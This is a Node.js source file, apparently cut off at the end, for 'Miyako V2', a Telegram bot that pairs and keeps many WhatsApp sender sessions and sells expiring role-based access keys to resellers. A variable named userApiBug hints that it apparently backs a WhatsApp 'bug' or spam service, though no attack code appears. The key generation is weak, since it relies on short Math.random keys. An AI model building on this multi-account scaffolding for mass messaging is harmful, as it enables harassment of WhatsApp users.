const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const fetch = require("node-fetch"); // pastikan sudah install node-fetch
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
//const { InlineKeyboard } = require("grammy");
const { spawn } = require('child_process');
const {
default: makeWASocket,
makeCacheableSignalKeyStore,
useMultiFileAuthState,
DisconnectReason,
fetchLatestBaileysVersion,
fetchLatestWaWebVersion,
generateForwardMessageContent,
prepareWAMessageMedia,
generateWAMessageFromContent,
generateMessageTag,
generateMessageID,
downloadContentFromMessage,
makeInMemoryStore,
getContentType,
jidDecode,
MessageRetryMap,
getAggregateVotesInPollMessage,
proto,
delay
} = require("@whiskeysockets/baileys");

const { tokens, owners: ownerIds, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const cors = require("cors");
const app = express();

// ✅ Allow semua origin
app.use(cors());

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const userSessionsPath = path.join(__dirname, "user_sessions.json");
const userEvents = new Map(); // Map untuk menyimpan event streams per user
let userApiBug = null;
let sock;

function getCountryCode(phoneNumber) {
    const countryCodes = {
        '1': 'US/Canada',
        '44': 'UK',
        '33': 'France',
        '49': 'Germany',
        '39': 'Italy',
        '34': 'Spain',
        '7': 'Russia',
        '81': 'Japan',
        '82': 'South Korea',
        '86': 'China',
        '91': 'India',
        '62': 'Indonesia',
        '60': 'Malaysia',
        '63': 'Philippines',
        '66': 'Thailand',
        '84': 'Vietnam',
        '65': 'Singapore',
        '61': 'Australia',
        '64': 'New Zealand',
        '55': 'Brazil',
        '52': 'Mexico',
        '57': 'Colombia',
        '51': 'Peru',
        '54': 'Argentina',
        '27': 'South Africa',
        '269': 'Comoros',
        '234': 'Nigeria',
        '58': 'Venezuela'
    };

    for (const [code, country] of Object.entries(countryCodes)) {
        if (phoneNumber.startsWith(code)) {
            return country;
        }
    }
    
    return 'International';
}

function loadAkses() {
  if (!fs.existsSync(file)) {
    const initData = {
      owners: [],
      akses: [],
      resellers: [],
      pts: [],
      moderators: []
    };
    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
    return initData;
  }

  // baca file
  let data = JSON.parse(fs.readFileSync(file));

  // normalisasi biar field baru tetep ada
  if (!data.resellers) data.resellers = [];
  if (!data.pts) data.pts = [];
  if (!data.moderators) data.moderators = [];

  return data;
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// === Helper role ===
function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  return (
    isOwner(id) ||
    data.akses.includes(id.toString()) ||
    data.resellers.includes(id.toString()) ||
    data.pts.includes(id.toString()) ||
    data.moderators.includes(id.toString())
  );
}

function isReseller(id) {
  const data = loadAkses();
  return data.resellers.includes(id.toString());
}

function isPT(id) {
  const data = loadAkses();
  return data.pts.includes(id.toString());
}

function isModerator(id) {
  const data = loadAkses();
  return data.moderators.includes(id.toString());
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


// === Utility ===
function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

// === User save/load ===
function saveUsers(users) {
  const filePath = path.join(__dirname, "database", "user.json");
  try {
    // Pastikan direktori database ada
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
      console.log(`✓ Created directory: ${dir}`);
    }

    // Pastikan setiap user punya role default 'user' jika tidak ada
    const usersWithRole = users.map(user => ({
      ...user,
      role: user.role || 'user'
    }));

    // Tulis file dengan format yang rapi
    fs.writeFileSync(filePath, JSON.stringify(usersWithRole, null, 2), "utf-8");
    console.log("✅  Data user berhasil disimpan. Total users:", usersWithRole.length);
    return true; // ✅ Kembalikan true jika sukses
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
    console.error("✗ Error details:", err.message);
    console.error("✗ File path:", filePath);
    return false; // ✅ Kembalikan false jika gagal
  }
}

function getUsers() {
  const filePath = path.join(__dirname, "database", "user.json");
  
  // Jika file tidak ada, buat file kosong
  if (!fs.existsSync(filePath)) {
    console.log(`📁 File user.json tidak ditemukan, membuat baru...`);
    const dir = path.dirname(filePath);
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
    const initialData = [];
    fs.writeFileSync(filePath, JSON.stringify(initialData, null, 2), "utf-8");
    return initialData;
  }
  
  try {
    const fileContent = fs.readFileSync(filePath, "utf-8");
    
    // Handle file kosong
    if (!fileContent.trim()) {
      console.log("⚠️ File user.json kosong, mengembalikan array kosong");
      return [];
    }
    
    const users = JSON.parse(fileContent);
    
    // Pastikan setiap user punya role
    return users.map(user => ({
      ...user,
      role: user.role || 'user'
    }));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    console.error("✗ Error details:", err.message);
    
    // Jika file corrupt, buat backup dan reset
    try {
      const backupPath = filePath + '.backup-' + Date.now();
      fs.copyFileSync(filePath, backupPath);
      console.log(`✓ Backup file corrupt dibuat: ${backupPath}`);
    } catch (backupErr) {
      console.error("✗ Gagal membuat backup:", backupErr);
    }
    
    // Reset file dengan array kosong
    const initialData = [];
    fs.writeFileSync(filePath, JSON.stringify(initialData, null, 2), "utf-8");
    console.log("✓ File user.json direset karena corrupt");
    
    return initialData;
  }
}

function loadUserSessions() {
  if (!fs.existsSync(userSessionsPath)) {
    console.log(`[SESSION] 📂 Creating new user_sessions.json`);
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
  
  try {
    const data = JSON.parse(fs.readFileSync(userSessionsPath, "utf8"));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 📂 Loaded ${sessionCount} sessions from ${Object.keys(data).length} users`);
    return data;
  } catch (err) {
    console.error("[SESSION] ❌ Error loading user_sessions.json, resetting:", err);
    // Reset file jika corrupt
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
}

const userSessionPath = (username, BotNumber) => {
  const userDir = path.join(sessions_dir, "users", username);
  const dir = path.join(userDir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function saveUserSessions(data) {
  try {
    fs.writeFileSync(userSessionsPath, JSON.stringify(data, null, 2));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 💾 Saved ${sessionCount} sessions for ${Object.keys(data).length} users`);
  } catch (err) {
    console.error("❌ Gagal menyimpan user_sessions.json:", err);
  }
}

// Function untuk mengirim event ke user
function sendEventToUser(username, eventData) {
  if (userEvents.has(username)) {
    const res = userEvents.get(username);
    try {
      res.write(`data: ${JSON.stringify(eventData)}\n\n`);
    } catch (err) {
      console.error(`[Events] Error sending to ${username}:`, err.message);
      userEvents.delete(username);
    }
  }
}

// ==================== AUTO RELOAD SESSIONS ON STARTUP ==================== //
let reloadAttempts = 0;
const MAX_RELOAD_ATTEMPTS = 3;

function forceReloadWithRetry() {
  reloadAttempts++;
  console.log(`\n🔄 RELOAD ATTEMPT ${reloadAttempts}/${MAX_RELOAD_ATTEMPTS}`);
  
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No sessions to reload - waiting for users to add senders');
    return;
  }
  
  console.log(`📋 Found ${Object.keys(userSessions).length} users with sessions`);
  simpleReloadSessions();
  
  // Check hasil setelah 30 detik
  setTimeout(() => {
    const activeSessionCount = sessions.size;
    console.log(`📊 Current active sessions: ${activeSessionCount}`);
    
    if (activeSessionCount === 0 && reloadAttempts < MAX_RELOAD_ATTEMPTS) {
      console.log(`🔄 No active sessions, retrying... (${reloadAttempts}/${MAX_RELOAD_ATTEMPTS})`);
      forceReloadWithRetry();
    } else if (activeSessionCount === 0) {
      console.log('❌ All reload attempts failed - manual reconnection required');
    } else {
      console.log(`✅ SUCCESS: ${activeSessionCount} sessions active`);
    }
  }, 30000);
}

// FUNCTION SANGAT SIMPLE
function simpleReloadSessions() {
  console.log('=== 🔄 SESSION RELOAD STARTED ===');
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No user sessions found - waiting for users to add senders');
    return;
  }

  let totalProcessed = 0;
  let successCount = 0;

  for (const [username, numbers] of Object.entries(userSessions)) {
    console.log(`👤 Processing user: ${username} with ${numbers.length} senders`);
    
    numbers.forEach(number => {
      totalProcessed++;
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, 'creds.json');
      
      // Cek apakah session files ada
      if (fs.existsSync(credsPath)) {
        console.log(`🔄 Attempting to reconnect: ${number} for ${username}`);
        
        connectToWhatsAppUser(username, number, sessionDir)
          .then(sock => {
            successCount++;
            console.log(`✅ Successfully reconnected: ${number}`);
          })
          .catch(err => {
            console.log(`❌ Failed to reconnect ${number}: ${err.message}`);
          });
      } else {
        console.log(`⚠️ No session files found for ${number}, skipping`);
      }
    });
  }
  
  console.log(`📊 Reload summary: ${successCount}/${totalProcessed} sessions reconnected`);
}

const connectToWhatsAppUser = async (username, BotNumber, sessionDir) => {
  try {
    console.log(`[${username}] 🚀 Starting WhatsApp connection for ${BotNumber}`);
    
    // Kirim event connecting
    sendEventToUser(username, {
      type: 'status',
      message: 'Memulai koneksi WhatsApp...',
      number: BotNumber,
      status: 'connecting'
    });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();

    // ✅ GUNAKAN LOGGER YANG SILENT
    const userSock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false
    });

    return new Promise((resolve, reject) => {
      let isConnected = false;
      let pairingCodeGenerated = false;
      let connectionTimeout;

      const cleanup = () => {
        if (connectionTimeout) clearTimeout(connectionTimeout);
      };

      userSock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        console.log(`[${username}] 🔄 Connection update:`, connection);

        if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          console.log(`[${username}] ❌ Connection closed with status:`, statusCode);

          // ❌ HAPUS DARI sessions MAP KETIKA TERPUTUS
          sessions.delete(BotNumber);
          console.log(`[${username}] 🗑️ Removed ${BotNumber} from sessions map`);

          if (statusCode === DisconnectReason.loggedOut) {
            console.log(`[${username}] 📵 Device logged out, cleaning session...`);
            sendEventToUser(username, {
              type: 'error',
              message: 'Device logged out, silakan scan ulang',
              number: BotNumber,
              status: 'logged_out'
            });
            
            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            cleanup();
            reject(new Error("Device logged out, please pairing again"));
            return;
          }

          if (statusCode === DisconnectReason.restartRequired || 
              statusCode === DisconnectReason.timedOut) {
            console.log(`[${username}] 🔄 Reconnecting...`);
            sendEventToUser(username, {
              type: 'status',
              message: 'Mencoba menyambung kembali...',
              number: BotNumber,
              status: 'reconnecting'
            });
            
            setTimeout(async () => {
              try {
                const newSock = await connectToWhatsAppUser(username, BotNumber, sessionDir);
                resolve(newSock);
              } catch (error) {
                reject(error);
              }
            }, 5000);
            return;
          }

          if (!isConnected) {
            cleanup();
            sendEventToUser(username, {
              type: 'error',
              message: `Koneksi gagal dengan status: ${statusCode}`,
              number: BotNumber,
              status: 'failed'
            });
            reject(new Error(`Connection failed with status: ${statusCode}`));
          }
        }

        if (connection === "open") {
          console.log(`[${username}] ✅ CONNECTED SUCCESSFULLY!`);
          isConnected = true;
          cleanup();
          
          // ✅ SIMPAN SOCKET KE sessions MAP GLOBAL - INI YANG PENTING!
          sessions.set(BotNumber, userSock);
          
          // ✅ KIRIM EVENT SUCCESS KE WEB
          sendEventToUser(username, {
            type: 'success',
            message: 'Berhasil terhubung dengan WhatsApp!',
            number: BotNumber,
            status: 'connected'
          });
          
          // ✅ SIMPAN KE USER SESSIONS
          const userSessions = loadUserSessions();
  if (!userSessions[username]) {
    userSessions[username] = [];
  }
  if (!userSessions[username].includes(BotNumber)) {
    userSessions[username].push(BotNumber);
    saveUserSessions(userSessions);
    console.log(`[${username}] 💾 Session saved for ${BotNumber}`);
  }
          
          resolve(userSock);
        }

        if (connection === "connecting") {
          console.log(`[${username}] 🔄 Connecting to WhatsApp...`);
          sendEventToUser(username, {
            type: 'status',
            message: 'Menghubungkan ke WhatsApp...',
            number: BotNumber,
            status: 'connecting'
          });
          
          // Generate pairing code jika belum ada credentials
          if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeGenerated) {
            pairingCodeGenerated = true;
            
            // Tunggu sebentar sebelum request pairing code
            setTimeout(async () => {
              try {
                console.log(`[${username}] 📞 Requesting pairing code for ${BotNumber}...`);
                sendEventToUser(username, {
                  type: 'status',
                  message: 'Meminta kode pairing...',
                  number: BotNumber,
                  status: 'requesting_code'
                });
                
                const code = await userSock.requestPairingCode(BotNumber);
                const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
                
                console.log(`╔═══════════════════════════════════╗`);
                console.log(`║  📱 PAIRING CODE - ${username}`);
                console.log(`╠═══════════════════════════════════╣`);
                console.log(`║  Nomor Sender : ${BotNumber}`);
                console.log(`║  Kode Pairing : ${formattedCode}`);
                console.log(`╚═══════════════════════════════════╝`);
                
                // KIRIM KODE PAIRING KE WEB INTERFACE
                sendEventToUser(username, {
                  type: 'pairing_code',
                  message: 'Kode Pairing Berhasil Digenerate!',
                  number: BotNumber,
                  code: formattedCode,
                  status: 'waiting_pairing',
                  instructions: [
                    '1. Buka WhatsApp di HP Anda',
                    '2. Tap ⋮ (titik tiga) > Linked Devices > Link a Device',
                    '3. Masukkan kode pairing berikut:',
                    `KODE: ${formattedCode}`,
                    '4. Kode berlaku 30 detik!'
                  ]
                });
                
              } catch (err) {
                console.error(`[${username}] ❌ Error requesting pairing code:`, err.message);
                sendEventToUser(username, {
                  type: 'error',
                  message: `Gagal meminta kode pairing: ${err.message}`,
                  number: BotNumber,
                  status: 'code_error'
                });
              }
            }, 3000);
          }
        }

        // Tampilkan QR code jika ada
        if (qr) {
          console.log(`[${username}] 📋 QR Code received`);
          sendEventToUser(username, {
            type: 'qr',
            message: 'Scan QR Code berikut:',
            number: BotNumber,
            qr: qr,
            status: 'waiting_qr'
          });
        }
      });

      userSock.ev.on("creds.update", saveCreds);
      
      // Timeout after 120 seconds
      connectionTimeout = setTimeout(() => {
        if (!isConnected) {
          sendEventToUser(username, {
            type: 'error', 
            message: 'Timeout - Tidak bisa menyelesaikan koneksi dalam 120 detik',
            number: BotNumber,
            status: 'timeout'
          });
          cleanup();
          reject(new Error("Connection timeout - tidak bisa menyelesaikan koneksi"));
        }
      }, 120000);
    });
  } catch (error) {
    console.error(`[${username}] ❌ Error in connectToWhatsAppUser:`, error);
    sendEventToUser(username, {
      type: 'error',
      message: `Error: ${error.message}`,
      number: BotNumber,
      status: 'error'
    });
    throw error;
  }
};

bot.command("start", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Unknown";

  const teks = `
<blockquote>🍁 Miyako V2</blockquote>
<i>Now Miyako has been updated</i>
<i>latest styles, lots of tools, and improved security system</i>

<blockquote>「 Information 」</blockquote>
<b>Developer : @mizukisnji</b>
<b>Version   : <code>2</code></b>
<b>Username  : ${username}</b>

<i>Silakan pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  const keyboard = Markup.keyboard([
    // Baris 1
    ["🔑 Settings Menu"],
    // Baris 2  
    ["ℹ️ Bot Info", "💬 Chat"],
    // Baris 3
    ["📢 Channel"]
  ])
  .resize()
  .oneTime(false);

  await ctx.reply(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
});

bot.hears("🔑 Settings Menu", async (ctx) => {
  const indictiveMenu = `
<blockquote>🍁 Miyako V2</blockquote>
<i>These are some settings menu</i>

<b>🔑 Settings Menu</b>
• /connect
• /listsender
• /delsender
• /ckey
• /listkey
• /delkey
• /addowner
• /delowner
• /myrole
`;

  // Kirim pesan baru dengan inline keyboard untuk back
  await ctx.reply(indictiveMenu, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("MIYAKO", "https://t.me/iyamijuk") ]
    ]).reply_markup
  });
});

bot.hears("ℹ️ Bot Info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Bot Information</blockquote>
<b>Miyako V2</b>
<i>Advanced multi-functional bot with enhanced security features and latest tools.</i>

<b>🔧 Features:</b>
• User Management
• Access Control
• Multi-tool Integration
• Secure Operations

<b>📞 Support:</b>
Contact @mizukisnji for assistance
`;

  await ctx.reply(infoText, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("MIYAKO", "https://t.me/iyamijuk") ]
    ]).reply_markup
  });
});

bot.hears("💬 Chat", (ctx) => {
  ctx.reply("💬 Chat dengan developer: https://t.me/mizukisnji");
});

bot.hears("📢 Channel", (ctx) => {
  ctx.reply("📢 Channel updates: https://t.me/iyamijuk");
});

// Handler untuk inline keyboard (tetap seperti semula)
bot.action("show_indictive_menu", async (ctx) => {
  const indictiveMenu = `
<blockquote>🍁 Miyako V2</blockquote>
<i>These are some settings menu</i>

<b>🔑 Settings Menu</b>
• /ckey
• /listkey
• /delkey
• /addowner
• /delowner
• /addreseller
• /delreseller
• /myrole
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("MIYAKO", "https://t.me/iyamijuk") ]
  ]);

  await ctx.editMessageText(indictiveMenu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("show_bot_info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Bot Information</blockquote>
<b>Miyako V2</b>
<i>Advanced multi-functional bot with enhanced security features and latest tools.</i>

<b>🔧 Features:</b>
• User Management
• Access Control
• Multi-tool Integration
• Secure Operations

<b>📞 Support:</b>
Contact @mizukisnji for assistance
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("MIYAKO", "https://t.me/iyamijuk") ]
  ]);

  await ctx.editMessageText(infoText, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("back_to_main", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Unknown";
  
  const teks = `
<blockquote>🍁 Miyako V2</blockquote>
<i>Now Miyako has been updated</i>
<i>latest styles, lots of tools, and improved security system</i>

<blockquote>「 Information 」</blockquote>
<b>Developer : @mizukisnji</b>
<b>Version   : <code>2</code></b>
<b>Username  : ${username}</b>

<i>Silakan pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  const keyboard = Markup.keyboard([
    ["🔑 Settings Menu"],
    ["ℹ️ Bot Info", "💬 Chat"],
    ["📢 Channel"]
  ])
  .resize()
  .oneTime(false);

  // Edit pesan yang ada untuk kembali ke menu utama
  await ctx.editMessageText(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

// command apalah terserah
bot.command("sessions", (ctx) => {
  const userSessions = loadUserSessions();
  const activeSessions = sessions.size;
  
  let message = `📊 **Session Status**\n\n`;
  message += `**Active Sessions:** ${activeSessions}\n`;
  message += `**Registered Users:** ${Object.keys(userSessions).length}\n\n`;
  
  Object.entries(userSessions).forEach(([username, numbers]) => {
    message += `**${username}:** ${numbers.length} sender(s)\n`;
    numbers.forEach(number => {
      const isActive = sessions.has(number);
      message += `  - ${number} ${isActive ? '✅' : '❌'}\n`;
    });
  });
  
  ctx.reply(message, { parse_mode: "Markdown" });
});

bot.command("ckey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak. Hanya Owner yang bisa menggunakan command ini.");
  }

  if (!args || !args.includes(",")) {
    return ctx.reply("✗ Format: /ckey <username>,<durasi>,<role>\n\nContoh:\n• /ckey Mizuk,3d,admin\n• /ckey user1,7d,reseller\n• /ckey user2,1d,user\n\nRole: owner, admin, reseller, user");
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const role = parts[2] ? parts[2].trim().toLowerCase() : 'user';

  // Validasi role
  const validRoles = ['owner', 'admin', 'reseller', 'user'];
  if (!validRoles.includes(role)) {
    return ctx.reply(`✗ Role tidak valid! Role yang tersedia: ${validRoles.join(', ')}`);
  }

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  const key = generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired, role };
  } else {
    users.push({ username, key, expired, role });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  await ctx.reply(
    `✅ <b>Key dengan Role berhasil dibuat:</b>\n\n` +
    `<b>Username:</b> <code>${username}</code>\n` +
    `<b>Key:</b> <code>${key}</code>\n` +
    `<b>Role:</b> <code>${role.toUpperCase()}</code>\n` +
    `<b>Expired:</b> <i>${expiredStr}</i> WIB`,
    { parse_mode: "HTML" }
  );
});

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }

  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `🟢 Active Key List:\n\n`;

  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `${i + 1}. ${u.username}\nKey: ${u.key}\nRole: ${u.role || 'user'}\nExpired: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner - tidak bisa sembarang orang bisa mengakses fitur ini.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey shin");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("myrole", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username || ctx.from.first_name || "User";
  
  let role = "User";
  if (isOwner(userId)) {
    role = "Owner";
  } else if (isModerator(userId)) {
    role = "Admin";
  } else if (isReseller(userId)) {
    role = "Reseller";
  } else if (isAuthorized(userId)) {
    role = "Authorized User";
  }
  
  ctx.reply(`
👤 <b>Role Information</b>

🆔 <b>User:</b> ${username}
🎭 <b>Bot Role:</b> ${role}
💻 <b>User ID:</b> <code>${userId}</code>

<i>Gunakan /ckey di bot untuk membuat key dengan role tertentu (Owner only)</i>
  `, { parse_mode: "HTML" });
});

bot.command("addreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isPT(userId) && !isModerator(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addreseller <id>");

  const data = loadAkses();
  if (data.resellers.includes(id)) return ctx.reply("✗ Already a reseller.");

  data.resellers.push(id);
  saveAkses(data);
  ctx.reply(`✓ Reseller added: ${id}`);
});

bot.command("delreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delreseller <id>");

  const data = loadAkses();
  data.resellers = data.resellers.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Reseller removed: ${id}`);
});
/* simpen aja dlu soalnya ga guna
bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✓ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✓ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delacces 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("✗ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✓ Access to user ID ${id} removed.`);
});*/

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✗ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✓ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delowner 7066156416", { parse_mode: "HTML" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("✗ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner ID ${id} was successfully deleted.`);
});

bot.command("getcode", async (ctx) => {
    const chatId = ctx.chat.id;
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!input) {
        return ctx.reply("❌ Missing input. Please provide a website URL.\n\nExample:\n/getcode https://example.com");
    }

    const url = input;

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/tools/getcode?url=${encodeURIComponent(url)}`;
        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return ctx.reply("❌ Failed to fetch source code. Please check the URL.");
        }

        const code = data.result;

        if (code.length > 4000) {
            // simpan ke file sementara
            const filePath = `sourcecode_${Date.now()}.html`;
            fs.writeFileSync(filePath, code);

            await ctx.replyWithDocument({ source: filePath, filename: `sourcecode.html` }, { caption: `📄 Full source code from: ${url}` });

            fs.unlinkSync(filePath); // hapus file setelah dikirim
        } else {
            await ctx.replyWithHTML(`📄 Source Code from: ${url}\n\n<code>${code}</code>`);
        }
    } catch (err) {
        console.error("GetCode API Error:", err);
        ctx.reply("❌ Error fetching website source code. Please try again later.");
    }
});

console.clear();
console.log(chalk.bold.white(`\n
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⠄⠀⡐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡈⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠄⠀⠀⠀⠀⠈⠙⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⡶⠦⣠⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠈⣟⠲⡎⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡰⢃⡠⠋⣠⠋
